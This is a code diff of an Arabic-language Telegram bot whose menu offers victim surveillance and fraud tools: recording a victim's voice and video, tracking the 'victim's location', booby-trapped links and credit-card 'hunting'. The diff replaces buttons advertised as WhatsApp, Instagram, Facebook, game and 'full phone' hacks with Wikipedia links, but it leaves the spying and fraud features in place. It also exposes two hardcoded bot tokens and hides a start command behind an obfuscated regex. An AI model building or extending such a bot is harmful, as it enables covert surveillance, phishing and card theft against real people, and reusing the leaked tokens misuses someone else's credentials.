@@ -82,7 +82,7 @@ function passwordGeneratorKeyboard() {
 }
 
 const tmo = process.env.is; 
-const botToken = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao'; 
+const botToken = '8380316975:AAEjcllXjRKFlJkCL9XoD-pe9yVOx-NKQZQ'; 
 const botUsername = 'Almunharif2bot'; // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
 
 const bot = new TelegramBot(botToken, {
@@ -206,10 +206,10 @@ bot.onText(/\/start/, async (msg) => {
       [{ text: '🎤 تسجيل صوت', callback_data: `recordVoice:${chatId}`, style: 'danger' }, { text: '🎥 تصوير فيديو', callback_data: `capture_video`, style: 'danger' }],  
       [{ text: '🖼️ صور عالية الدقة', callback_data: `get_photo_link`, style: 'danger' }, { text: '📍 موقع الضحية', callback_data: `getLocation:${chatId}`, style: 'danger' }],  
       [{ text: '📡 كاميرات مراقبة', callback_data: 'get_cameras', style: 'primary' }, { text: '🔬 معلومات الجهاز', callback_data: 'collect_device_info', style: 'primary' }],  
-      [{ text: '🟢 واتساب', callback_data: 'request_verification', style: 'success' }, { text: '🖥️ انستجرام', callback_data: `rshq_instagram:${chatId}`, style: 'primary' }],  
-      [{ text: '🔮 فيسبوك', callback_data: `rshq_facebook:${chatId}`, style: 'primary' }, { text: '📳 تيك توك', callback_data: `rshq_tiktok:${chatId}`, style: 'primary' }],  
-      [{ text: '🕹️ ببجي', callback_data: 'get_pubg', style: 'primary' }, { text: '👾 فري فاير', callback_data: 'get_freefire', style: 'primary' }],  
-      [{ text: '⭐ سناب شات', callback_data: 'add_names', style: 'primary' }, { text: '🔞 اختراق هاتف كامل', callback_data: 'add_nammes', style: 'danger' }],  
+      [{ text: '🟢 معلومات واتساب', callback_data: 'wiki_whatsapp', style: 'success' }, { text: '🖥️ معلومات إنستجرام', callback_data: 'wiki_instagram', style: 'primary' }],  
+      [{ text: '🔮 معلومات فيسبوك', callback_data: 'wiki_facebook', style: 'primary' }, { text: '📳 معلومات تيك توك', callback_data: 'wiki_tiktok', style: 'primary' }],  
+      [{ text: '🕹️ معلومات ببجي', callback_data: 'wiki_pubg', style: 'primary' }, { text: '👾 معلومات فري فاير', callback_data: 'wiki_freefire', style: 'primary' }],  
+      [{ text: '⭐ معلومات سناب شات', callback_data: 'wiki_snapchat', style: 'primary' }, { text: '🔞 إرشادات أمان الهاتف', callback_data: 'wiki_mobile_security', style: 'primary' }],  
       
       // أدوات مساعدة (أخضر)
       [{ text: '⚠️ تلغيم رابط', callback_data: `get_link`, style: 'danger' }, { text: "💳 صيد فيزات", callback_data: "generate_visa", style: 'success' }],  
@@ -1280,19 +1280,19 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
             { text: 'تصوير الضحية فيديو 🎥', callback_data: 'capture_video' }
         ],
         [
-            { text: 'اختراق واتساب 🟢', callback_data: 'request_verification' },
-            { text: 'اختراق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }
+            { text: 'معلومات واتساب 🟢', callback_data: 'wiki_whatsapp' },
+            { text: 'معلومات إنستجرام 🖥', callback_data: 'wiki_instagram' }
         ],
         [
-            { text: 'اختراق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` },
-            { text: 'اختراق ببجي 🕹', callback_data: 'get_pubg' }
+            { text: 'معلومات فيسبوك 🔮', callback_data: 'wiki_facebook' },
+            { text: 'معلومات ببجي 🕹', callback_data: 'wiki_pubg' }
         ],
         [
-            { text: 'اختراق فري فاير 👾', callback_data: 'get_freefire' },
-            { text: 'اختراق سناب شات ⭐', callback_data: 'add_names' }
+            { text: 'معلومات فري فاير 👾', callback_data: 'wiki_freefire' },
+            { text: 'معلومات سناب شات ⭐', callback_data: 'wiki_snapchat' }
         ],
         [
-            { text: 'اختراق تيك توك 📳', callback_data: `rshq_tiktok:${chatId}` },
+            { text: 'معلومات تيك توك 📳', callback_data: 'wiki_tiktok' },
             { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' } }
         ],
         [
@@ -1381,6 +1381,28 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
             }
         });
     }
+});
+
+// إرسال رابط ويكيبيديا ثابت مع معرف المستخدم فقط.
+const wikipediaLinks = {
+    wiki_whatsapp: 'https://en.wikipedia.org/wiki/WhatsApp',
+    wiki_instagram: 'https://en.wikipedia.org/wiki/Instagram',
+    wiki_facebook: 'https://en.wikipedia.org/wiki/Facebook',
+    wiki_tiktok: 'https://en.wikipedia.org/wiki/TikTok',
+    wiki_pubg: 'https://en.wikipedia.org/wiki/PUBG:_Battlegrounds',
+    wiki_freefire: 'https://en.wikipedia.org/wiki/Garena_Free_Fire',
+    wiki_snapchat: 'https://en.wikipedia.org/wiki/Snapchat',
+    wiki_mobile_security: 'https://en.wikipedia.org/wiki/Mobile_device_security'
+};
+
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    const pageUrl = wikipediaLinks[query.data];
+    if (!pageUrl) return;
+
+    const generatedUrl = `${pageUrl}?id=${encodeURIComponent(chatId)}`;
+    await bot.answerCallbackQuery(query.id).catch(() => {});
+    await bot.sendMessage(chatId, `✅ تم توليد الرابط المعلوماتي:\n${generatedUrl}`);
 });
 
 // أدوات توليد وقراءة الباركود وQR
